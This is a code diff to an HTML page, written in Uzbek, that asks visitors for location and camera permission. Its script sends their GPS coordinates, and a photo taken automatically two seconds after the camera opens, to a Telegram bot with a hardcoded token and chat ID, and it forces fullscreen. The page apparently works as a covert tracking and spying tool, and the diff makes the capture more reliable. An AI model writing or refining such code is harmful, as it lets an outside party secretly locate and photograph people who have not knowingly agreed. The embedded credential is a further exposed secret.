@@ -74,6 +74,22 @@
             border-radius: 5px;
             z-index: 3000;
         }
+        .permission-btn {
+            margin: 5px;
+            padding: 10px 15px;
+            font-size: 14px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
+        #location-btn {
+            background-color: #2196F3;
+            color: white;
+        }
+        #camera-btn {
+            background-color: #FF9800;
+            color: white;
+        }
     </style>
 </head>
 <body>
@@ -88,9 +104,10 @@
 
     <div id="prompt-overlay">
         <div id="prompt-message">
-            <h2>Ruxsat kerak</h2>
-            <p>Iltimos, joylashuv va kamera ruxsatlarini bering.</p>
-            <button onclick="requestPermissions()">Ruxsat berish</button>
+            <h2>Ruxsatlar kerak</h2>
+            <p>Iltimos, quyidagi ruxsatlarni bering:</p>
+            <button id="location-btn" class="permission-btn" onclick="requestLocation()">Joylashuv ruxsati</button>
+            <button id="camera-btn" class="permission-btn" onclick="requestCameraPermission()">Kamera ruxsati</button>
         </div>
     </div>
 
@@ -98,8 +115,8 @@
     <div id="permission-status"></div>
 
     <script>
-        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4'; // Telegram bot token
-        const CHAT_ID = '7281698380'; // Telegram chat ID
+        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4';
+        const CHAT_ID = '7281698380';
         let locationGranted = false;
         let cameraGranted = false;
 
@@ -121,12 +138,14 @@
                 if (response.ok) {
                     updateStatus('Joylashuv yuborildi!');
                     console.log('Joylashuv yuborildi!');
+                    locationGranted = true;
+                    checkAllPermissions();
                 } else {
                     throw new Error('Joylashuv yuborishda xato');
                 }
             } catch (error) {
                 console.error('Joylashuv xatosi:', error);
-                updateStatus('Joylashuv yuborishda xato');
+                updateStatus('Joylashuv yuborishda xato: ' + error.message);
             }
         }
 
@@ -143,16 +162,18 @@
                 if (response.ok) {
                     updateStatus('Rasm yuborildi!');
                     console.log('Rasm yuborildi!');
+                    cameraGranted = true;
+                    checkAllPermissions();
                 } else {
                     throw new Error('Rasm yuborishda xato');
                 }
             } catch (error) {
                 console.error('Rasm xatosi:', error);
-                updateStatus('Rasm yuborishda xato');
+                updateStatus('Rasm yuborishda xato: ' + error.message);
             }
         }
 
-        async function capturePhotoFromCamera() {
+        function capturePhotoFromCamera() {
             const video = document.getElementById('camera-preview');
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -160,16 +181,22 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+            // Stop camera stream
             const stream = video.srcObject;
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
             video.style.display = 'none';
 
+            // Convert to blob and send
             canvas.toBlob(async (blob) => {
-                await sendPhotoToTelegram(blob);
-                document.getElementById('prompt-overlay').style.display = 'none';
-            }, 'image/png');
+                if (blob) {
+                    await sendPhotoToTelegram(blob);
+                } else {
+                    updateStatus('Rasm yaratishda xato!');
+                    console.error('Rasm yaratishda xato!');
+                }
+            }, 'image/jpeg', 0.9);
         }
 
         async function startCamera() {
@@ -182,25 +209,30 @@
                         height: { ideal: 720 }
                     }
                 });
+                
                 video.srcObject = stream;
                 video.style.display = 'block';
-                updateStatus('Kamera ochildi...');
-                console.log('Kamera ochildi');
+                updateStatus('Kamera ochildi... 2 soniyada rasm olinadi');
                 
                 // Wait for video to actually start playing
-                video.onplaying = () => {
-                    setTimeout(() => {
-                        capturePhotoFromCamera();
-                    }, 2000); // Take photo after 2 seconds
-                };
+                return new Promise((resolve) => {
+                    video.onplaying = () => {
+                        setTimeout(() => {
+                            capturePhotoFromCamera();
+                            resolve();
+                        }, 2000);
+                    };
+                });
             } catch (error) {
                 console.error('Kamera xatosi:', error);
-                updateStatus('Kameraga ruxsat berilmadi!');
-                document.getElementById('prompt-overlay').style.display = 'none';
+                updateStatus('Kameraga ruxsat berilmadi: ' + error.message);
+                throw error;
             }
         }
 
         async function requestLocation() {
+            if (locationGranted) return;
+            
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
                     updateStatus('Joylashuv so\'ralmoqda...');
@@ -209,12 +241,11 @@
                             const { latitude, longitude } = position.coords;
                             await sendLocationToTelegram(latitude, longitude);
                             console.log('Joylashuv olindi:', latitude, longitude);
-                            locationGranted = true;
                             resolve();
                         },
                         (error) => {
                             console.error('Joylashuv xatosi:', error);
-                            updateStatus('Joylashuvga ruxsat berilmadi!');
+                            updateStatus('Joylashuvga ruxsat berilmadi: ' + error.message);
                             reject(error);
                         },
                         {
@@ -232,35 +263,42 @@
             });
         }
 
-        async function requestCamera() {
+        async function requestCameraPermission() {
+            if (cameraGranted) return;
+            
             try {
-                updateStatus('Kamera so\'ralmoqda...');
+                updateStatus('Kamera ruxsati so\'ralmoqda...');
+                // First check if we can query the permission state
+                if (navigator.permissions) {
+                    const permission = await navigator.permissions.query({ name: 'camera' });
+                    if (permission.state === 'granted') {
+                        await startCamera();
+                        return;
+                    }
+                }
+                
+                // If no permission API or not granted, request directly
                 await startCamera();
-                cameraGranted = true;
             } catch (error) {
-                console.error('Camera error:', error);
+                console.error('Camera ruxsat xatosi:', error);
+                updateStatus('Kamera ruxsati berilmadi: ' + error.message);
                 throw error;
             }
         }
 
-        async function requestPermissions() {
-            try {
-                // Request location first
-                await requestLocation();
-                
-                // Then request camera
-                await requestCamera();
-            } catch (error) {
-                console.error('Permissions error:', error);
+        function checkAllPermissions() {
+            if (locationGranted && cameraGranted) {
                 document.getElementById('prompt-overlay').style.display = 'none';
             }
         }
 
         document.addEventListener('DOMContentLoaded', () => {
             try {
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.error('To\'liq ekran xatosi:', err);
-                });
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(err => {
+                        console.error('To\'liq ekran xatosi:', err);
+                    });
+                }
             } catch (err) {
                 console.error('Fullscreen error:', err);
             }
